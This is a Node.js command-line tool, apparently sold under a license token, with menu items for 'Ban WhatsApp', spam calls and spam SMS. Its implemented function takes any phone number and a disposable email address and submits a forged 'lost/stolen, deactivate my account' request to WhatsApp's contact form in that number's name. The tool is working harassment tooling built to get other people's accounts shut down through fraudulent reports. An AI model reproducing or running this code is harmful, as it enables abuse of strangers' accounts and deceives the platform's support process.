const { exec } = require('child_process')
const axios = require('axios').default
const cheerio = require('cheerio')
const util = require('node:util')
const readline = require('node:readline')
const rdline = readline.createInterface({input: process.stdin,output: process.stdout});

const key = '4064636F646564656E7061'

const login = () => {
return new Promise((resolve) => {
rdline.question("License Token: ", token => {
if (token == key) {
menu()
} else {
console.log("\x1b[41m", 'Wrong Token!, Please Contact wa.me/6285866295942', '\x1b[0m')
exec(`xdg-open https://wa.me/6285866295942?text=buy+license+[dv-tools]`, (error, stdout, stderr) => {});
setTimeout (() => {console.clear();login()},3000);}});});};

const menu = () => {
return new Promise((resolve) => {
console.clear()
rdline.question("Menu:\n1.Start\n2.Join Grup\n3.Update Script\n4.Exit\nAnswer: ", menua => {
if (menua == 1) {
start();
} else if (menua == 2){ 
exec(`xdg-open https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx`, (error, stdout, stderr) => {});
console.clear();
menu();
} else if (menua == 3){ 
exec(`git pull`, (error, stdout, stderr) => {});
setTimeout (() => {resolve(menu());},3000);
} else if (menua == 4){ 
rdline.close();
} else {
console.log("\x1b[41m", 'Command not Found!', '\x1b[0m')
setTimeout (() => {resolve(menu());},3000);}});});};

const start = () => {
return new Promise((resolve) => {
console.clear()
rdline.question("Menu:\n1.Ban WhatsApp\n2.Spam Call\n3.Spam Sms\n4.Back\n5.Exit\nAnswer: ", starta => {
if (starta == 1) {
banwa();
} else if (starta == 4){ 
menu();
} else if (starta == 5){ 
rdline.close();
} else {
console.log("\x1b[41m", 'Command not Found!', '\x1b[0m')
setTimeout (() => {resolve(start());},3000);}});});};

const banwa = () => {
return new Promise((resolve) => {
console.clear()
rdline.question("Enter Number: ", async (nomor) => {
var nom = nomor
if (!nom.startsWith("+")) nom = "+"+nomor
var finding = await (await require ("awesome-phonenumber")(nom)).g
var ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
var email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", finding.regionCode)
form.append("phone_number", finding.number.international)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
var res = await axios({url,method: "POST",data: form,headers: {cookie}})
if (res.data.includes("true")) {
console.log("\x1b[32m", `Success Banned: ${nom}\n\nResults: Data ${util.format(JSON.parse(res.data.replace("for (;;);", "")))}\n\nParams: ${util.format(form)}`, '\x1b[0m'.replace("Perdido/roubado: desative minha conta", "CENSORED").replace(email.data[0], "CENSORED").replace(email.data[0], "CENSORED"))
rdline.question("Success Banned, Want to Retry? (y or n) ", async (banwaa) => {
if (banwaa == 'y') {
banwa();
} else if (banwaa== 'n'){ 
start();
} else {
console.log("\x1b[41m", 'Command not Found, Back to Menu!', '\x1b[0m')
setTimeout (() => {resolve(menu());},3000);}})
} else {
console.log("\x1b[41m", 'Error: Please try another Number', '\x1b[0m')
setTimeout (() => {banwa();},3000);}});});};

const main = async () => {
console.clear()
login();}
main();

rdline.on('close', () => {
console.log("\x1b[44m", 'Closed, Have a Great day!', '\x1b[0m');
process.exit(0);});